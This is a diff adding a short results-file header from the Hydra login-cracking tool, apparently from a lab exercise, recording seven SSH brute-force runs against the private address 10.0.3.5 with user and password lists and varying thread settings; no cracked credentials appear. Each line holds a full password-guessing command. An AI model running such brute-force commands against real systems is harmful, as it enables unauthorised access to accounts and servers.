@@ -1,0 +1,7 @@
+# Hydra v9.2 run at 2026-05-13 19:35:28 on 10.0.3.5 ssh (hydra -L usuarios.txt -P todas_pass.txt -t 4 -w 2 -v -o resultado.txt ssh://10.0.3.5)
+# Hydra v9.2 run at 2026-05-13 19:48:17 on 10.0.3.5 ssh (hydra -L usuarios.txt -P todas_pass.txt -t 4 -w 2 -v -o resultado.txt ssh://10.0.3.5)
+# Hydra v9.2 run at 2026-05-13 21:13:43 on 10.0.3.5 ssh (hydra -L usuarios.txt -P todas_pass.txt -t 5 -w 2 -v -o resultado.txt ssh://10.0.3.5)
+# Hydra v9.2 run at 2026-05-13 21:21:53 on 10.0.3.5 ssh (hydra -L usuarios.txt -P todas_pass.txt -t 5 -w 1 -v -o resultado.txt ssh://10.0.3.5)
+# Hydra v9.2 run at 2026-05-13 21:25:40 on 10.0.3.5 ssh (hydra -L usuarios.txt -P todas_pass.txt -t 8 -w 1 -v -o resultado.txt ssh://10.0.3.5)
+# Hydra v9.2 run at 2026-05-13 21:26:27 on 10.0.3.5 ssh (hydra -L usuarios.txt -P todas_pass.txt -t 6 -w 1 -v -o resultado.txt ssh://10.0.3.5)
+# Hydra v9.2 run at 2026-05-13 21:28:11 on 10.0.3.5 ssh (hydra -L usuarios.txt -P todas_pass.txt -t 5 -w 1 -v -o resultado.txt ssh://10.0.3.5)
